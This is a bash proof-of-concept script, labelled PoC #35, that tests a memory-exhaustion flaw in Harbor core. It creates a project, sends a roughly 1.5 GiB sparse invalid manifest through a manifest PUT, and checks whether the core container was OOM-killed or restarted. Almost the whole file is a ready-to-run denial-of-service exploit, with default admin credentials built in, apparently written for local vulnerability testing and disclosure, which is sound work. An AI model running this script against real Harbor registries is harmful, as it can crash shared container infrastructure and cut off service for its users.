#!/usr/bin/env bash
set -euo pipefail

# PoC #35: manifest upload OOM via unbounded request-body reads in Harbor core.
#
# This is intentionally local-dev oriented. It:
#   1. finds the Harbor core container,
#   2. optionally caps it to MEM_LIMIT/CPUS,
#   3. records baseline and attack-time memory samples,
#   4. sends a large invalid manifest body to PUT /v2/<project>/<repo>/manifests/<tag>,
#   5. reports whether core OOMed, restarted, stopped, or stayed healthy.
#
# Defaults are conservative for a local Harbor dev instance. Override as needed:
#   HARBOR_URL=http://127.0.0.1:8180 PAYLOAD_MB=1536 ./security-pocs/simple.sh
#
# Set APPLY_LIMIT=false to skip docker update. Set KEEP_PAYLOAD=true to keep the
# sparse payload file for inspection.

HARBOR_URL="${HARBOR_URL:-}"
HARBOR_USER="${HARBOR_USER:-${ADMIN_USER:-admin}}"
HARBOR_PASS="${HARBOR_PASS:-${ADMIN_PASS:-Harbor12345}}"
CORE_CONTAINER="${CORE_CONTAINER:-}"
PROJECT="${PROJECT:-poc35oom}"
REPO="${REPO:-manifest-oom}"
TAG="${TAG:-poc35-$(date +%s)}"
PAYLOAD_MB="${PAYLOAD_MB:-1536}"
MEM_LIMIT="${MEM_LIMIT:-1g}"
CPUS="${CPUS:-2}"
APPLY_LIMIT="${APPLY_LIMIT:-true}"
CURL_MAX_TIME="${CURL_MAX_TIME:-180}"
SAMPLE_INTERVAL="${SAMPLE_INTERVAL:-1}"
KEEP_PAYLOAD="${KEEP_PAYLOAD:-false}"
WORKDIR="${WORKDIR:-$(mktemp -d -t harbor-poc35.XXXXXX)}"
SAMPLES="$WORKDIR/core-stats.tsv"
PAYLOAD="$WORKDIR/invalid-manifest-${PAYLOAD_MB}MiB.bin"
RESP_BODY="$WORKDIR/response-body.txt"
RESP_HEADERS="$WORKDIR/response-headers.txt"

need() {
  command -v "$1" >/dev/null || {
    echo "missing dependency: $1" >&2
    exit 1
  }
}

cleanup() {
  if [[ "${monitor_pid:-}" ]]; then
    kill "$monitor_pid" >/dev/null 2>&1 || true
    wait "$monitor_pid" >/dev/null 2>&1 || true
  fi

  if [[ "$KEEP_PAYLOAD" != "true" ]]; then
    rm -rf "$WORKDIR"
  else
    echo "kept workdir: $WORKDIR"
  fi
}
trap cleanup EXIT

api() {
  curl -ksS -u "$HARBOR_USER:$HARBOR_PASS" "$@"
}

probe_url() {
  local url="$1"
  curl -ksS --max-time 3 "$url/api/v2.0/ping" >/dev/null 2>&1
}

choose_harbor_url() {
  if [[ -n "$HARBOR_URL" ]]; then
    echo "$HARBOR_URL"
    return
  fi

  local candidate
  for candidate in http://127.0.0.1:8080 http://127.0.0.1:8180; do
    if probe_url "$candidate"; then
      echo "$candidate"
      return
    fi
  done

  echo "http://127.0.0.1:8080"
}

find_core_container() {
  if [[ -n "$CORE_CONTAINER" ]]; then
    echo "$CORE_CONTAINER"
    return
  fi

  docker ps --format '{{.Names}}' |
    awk '/(^|_)core(_|$)/ { print; exit }'
}

inspect_field() {
  local container="$1"
  local template="$2"
  docker inspect "$container" --format "$template" 2>/dev/null || true
}

container_status_line() {
  local container="$1"
  docker inspect "$container" \
    --format 'status={{.State.Status}} running={{.State.Running}} exit={{.State.ExitCode}} oom={{.State.OOMKilled}} restart_count={{.RestartCount}} memory={{.HostConfig.Memory}} nano_cpus={{.HostConfig.NanoCpus}}' \
    2>/dev/null || true
}

monitor_core() {
  local container="$1"

  printf 'epoch\tmem_usage\tcpu\n' >"$SAMPLES"
  while true; do
    {
      printf '%s\t' "$(date +%s)"
      docker stats --no-stream --format '{{.MemUsage}}\t{{.CPUPerc}}' "$container" 2>/dev/null || printf 'unavailable\tunavailable'
      printf '\n'
    } >>"$SAMPLES"
    sleep "$SAMPLE_INTERVAL"
  done
}

make_sparse_payload() {
  mkdir -p "$WORKDIR"

  # Sparse file: appears large to curl and Harbor, but does not allocate that
  # much disk on the client. The NUL body is intentionally invalid JSON; Harbor
  # core still has to read the whole body before manifest parsing rejects it.
  truncate -s "${PAYLOAD_MB}M" "$PAYLOAD"
}

ensure_project() {
  local code
  code="$(
    api -o /dev/null -w '%{http_code}' \
      -X POST "$HARBOR_URL/api/v2.0/projects" \
      -H 'Content-Type: application/json' \
      -d "{\"project_name\":\"$PROJECT\",\"metadata\":{\"public\":\"false\"}}" || true
  )"

  case "$code" in
    201) echo "created project: $PROJECT" ;;
    409) echo "project already exists: $PROJECT" ;;
    401|403)
      echo "project create returned HTTP $code; continuing, assuming $HARBOR_USER already has push access to $PROJECT" >&2
      ;;
    *)
      echo "project create returned HTTP $code; continuing to manifest PUT" >&2
      ;;
  esac
}

print_tail() {
  local file="$1"
  if [[ -s "$file" ]]; then
    tail -n 20 "$file"
  fi
}

need curl
need docker
need awk
need truncate

HARBOR_URL="$(choose_harbor_url)"
CORE_CONTAINER="$(find_core_container)"

if [[ -z "$CORE_CONTAINER" ]]; then
  echo "could not find a running Harbor core container; set CORE_CONTAINER explicitly" >&2
  exit 1
fi

if ! docker inspect "$CORE_CONTAINER" >/dev/null 2>&1; then
  echo "core container not found: $CORE_CONTAINER" >&2
  exit 1
fi

if ! probe_url "$HARBOR_URL"; then
  echo "Harbor core is not reachable at $HARBOR_URL/api/v2.0/ping" >&2
  echo "container: $CORE_CONTAINER"
  echo "state: $(container_status_line "$CORE_CONTAINER")"
  exit 1
fi

echo "Harbor URL: $HARBOR_URL"
echo "Core container: $CORE_CONTAINER"
echo "Initial state: $(container_status_line "$CORE_CONTAINER")"

before_restart="$(inspect_field "$CORE_CONTAINER" '{{.RestartCount}}')"
before_started="$(inspect_field "$CORE_CONTAINER" '{{.State.StartedAt}}')"

if [[ "$APPLY_LIMIT" == "true" ]]; then
  echo "Applying container cap: memory=$MEM_LIMIT memory-swap=$MEM_LIMIT cpus=$CPUS"
  docker update --memory "$MEM_LIMIT" --memory-swap "$MEM_LIMIT" --cpus "$CPUS" "$CORE_CONTAINER" >/dev/null
  echo "After cap: $(container_status_line "$CORE_CONTAINER")"
fi

echo "Baseline sample:"
docker stats --no-stream --format '  {{.Name}} mem={{.MemUsage}} cpu={{.CPUPerc}}' "$CORE_CONTAINER" || true

ensure_project
make_sparse_payload
echo "Payload: $PAYLOAD (${PAYLOAD_MB} MiB sparse invalid manifest)"
echo "Stats samples: $SAMPLES"

monitor_core "$CORE_CONTAINER" &
monitor_pid="$!"
sleep 2

manifest_url="$HARBOR_URL/v2/$PROJECT/$REPO/manifests/$TAG"
echo "PUT $manifest_url"

set +e
curl -ksS \
  -D "$RESP_HEADERS" \
  -o "$RESP_BODY" \
  -w '%{http_code}' \
  --max-time "$CURL_MAX_TIME" \
  -u "$HARBOR_USER:$HARBOR_PASS" \
  -X PUT "$manifest_url" \
  -H 'Content-Type: application/vnd.oci.image.manifest.v1+json' \
  --data-binary @"$PAYLOAD" >"$WORKDIR/http-code.txt"
curl_rc=$?
set -e

sleep 3
kill "$monitor_pid" >/dev/null 2>&1 || true
wait "$monitor_pid" >/dev/null 2>&1 || true
monitor_pid=""

http_code="$(cat "$WORKDIR/http-code.txt" 2>/dev/null || true)"
after_restart="$(inspect_field "$CORE_CONTAINER" '{{.RestartCount}}')"
after_started="$(inspect_field "$CORE_CONTAINER" '{{.State.StartedAt}}')"
after_oom="$(inspect_field "$CORE_CONTAINER" '{{.State.OOMKilled}}')"
after_running="$(inspect_field "$CORE_CONTAINER" '{{.State.Running}}')"

echo
echo "curl_rc=$curl_rc http_code=${http_code:-none}"
echo "Final state: $(container_status_line "$CORE_CONTAINER")"
echo "Health after PUT:"
if probe_url "$HARBOR_URL"; then
  echo "  ping: ok"
  health_ok=true
else
  echo "  ping: failed"
  health_ok=false
fi

echo
echo "Peak-ish samples (tail):"
print_tail "$SAMPLES"

echo
echo "Response headers:"
print_tail "$RESP_HEADERS"
echo
echo "Response body:"
print_tail "$RESP_BODY"

echo
if [[ "$after_oom" == "true" ]]; then
  echo "CONFIRMED: core container reports OOMKilled=true after manifest upload."
  exit 10
fi

if [[ "$after_running" != "true" ]]; then
  echo "CONFIRMED: core container is no longer running after manifest upload."
  exit 10
fi

if [[ "$before_restart" != "$after_restart" || "$before_started" != "$after_started" ]]; then
  echo "CONFIRMED: core restarted during/after manifest upload."
  exit 10
fi

if [[ "$health_ok" != "true" ]]; then
  echo "SUSPECT: core did not report OOM/restart, but health check failed after manifest upload."
  exit 11
fi

echo "NOT CONFIRMED: core stayed running and healthy for this payload/limit."
exit 0
